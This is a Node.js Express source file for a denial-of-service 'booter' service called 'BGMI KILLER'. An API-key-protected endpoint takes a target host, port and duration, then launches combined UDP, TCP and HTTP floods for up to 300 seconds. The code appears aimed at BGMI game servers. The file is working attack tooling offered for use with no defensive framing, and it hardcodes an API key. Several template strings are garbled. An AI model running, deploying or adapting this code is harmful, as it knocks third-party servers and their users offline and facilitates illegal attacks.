const express = require('express');
const net = require('net');
const dgram = require('dgram');
const http = require('http');

const app = express();

// ==================== API KEY ====================
const API_KEY = process.env.API_KEY || "z_psr6hn0inxLW5xSin59tVfAJq36XabJpuerWMSAZc";

app.get('/api/v1/attack', (req, res) => {
    const { key, host, port = "17870", time = "300", method = "ALL" } = req.query;

    if (key !== API_KEY) return res.send("INVALID KEY");

    const duration = Math.min(parseInt(time) || 300, 300);
    const targetPort = parseInt(port) || 17870;

    console.log(`[BGMI KILLER] \( {host}: \){targetPort} | ${duration}s | Method: ${method}`);

    startFullAttack(host, targetPort, duration, method.toUpperCase());

    res.send("SUCCESS → BGMI ATTACK STARTED");
});

function startFullAttack(target, port, duration, method) {
    const endTime = Date.now() + duration * 1000;

    // ==================== UDP FLOOD (Best for BGMI) ====================
    if (method === "UDP" || method === "ALL") {
        const udp = dgram.createSocket('udp4');
        const payload = Buffer.alloc(4096);
        
        const udpInterval = setInterval(() => {
            if (Date.now() > endTime) {
                clearInterval(udpInterval);
                udp.close();
                return;
            }
            for (let i = 0; i < 140; i++) {
                udp.send(payload, 0, payload.length, port, target);
            }
        }, 4);
    }

    // ==================== TCP FLOOD ====================
    if (method === "TCP" || method === "ALL") {
        const tcpInterval = setInterval(() => {
            if (Date.now() > endTime) return;
            for (let i = 0; i < 65; i++) {
                const socket = net.connect(port, target);
                socket.write(Buffer.alloc(8192, 'x'));
                setTimeout(() => socket.destroy(), 650);
            }
        }, 12);
    }

    // ==================== HTTP FLOOD ====================
    if (method === "HTTP" || method === "ALL") {
        const httpInterval = setInterval(() => {
            if (Date.now() > endTime) return;
            for (let i = 0; i < 220; i++) {
                http.get(`http://\( {target}: \){port}`).on('error', () => {});
            }
        }, 10);
    }
}

app.get('/status', (req, res) => {
    res.json({
        status: "LIVE",
        max_time: "300 seconds",
        methods: "UDP + TCP + HTTP + ALL",
        ports: "ALL PORTS SUPPORTED",
        optimized: "BGMI"
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 BGMI FULL POWER API RUNNING ON PORT ${PORT}`);
    console.log(`API Key: ${API_KEY ? "SET" : "NOT SET"}`);
});